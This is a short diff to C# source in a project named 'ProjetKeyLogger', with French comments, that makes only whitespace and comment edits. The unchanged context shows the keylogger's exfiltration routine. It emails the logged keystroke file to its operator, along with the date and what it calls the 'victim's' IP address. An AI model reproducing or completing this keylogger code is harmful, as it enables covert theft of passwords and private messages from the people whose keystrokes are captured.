@@ -377,12 +377,9 @@ namespace ProjetKeyLogger
                         //envoie du mail
                         envoieMail();
                     }
-                    
-                }
-                                
+                  }           
             }
         }
-
 
         //Envoie du fichier par mail
         private void envoieMail()
@@ -399,7 +396,6 @@ namespace ProjetKeyLogger
             var nom_ordinateur = Dns.GetHostEntry(Dns.GetHostName());
 
             //Création du corps du mail
-            //Utiliser les autres fonctions de charlie 
             string corps_mail = "date : " + date_mail + "\n Adresse ip de la victime :" + nom_ordinateur + "\n";
             corps_mail += contenu_fichier;
 
@@ -441,7 +437,7 @@ namespace ProjetKeyLogger
             //Envoie du message
             client.Send(message_mail);
 
-            // Libère les ressources utilisé par le fichier envoyé par mail. Cela supprime le flux et permet au programme de continuer, sans cela le programme plante.
+            // Libère les ressources utilisées par le fichier envoyé par mail. Cela supprime le flux et permet au programme de continuer, sans cela le programme plante.
             message_mail.Dispose();
         }
     }
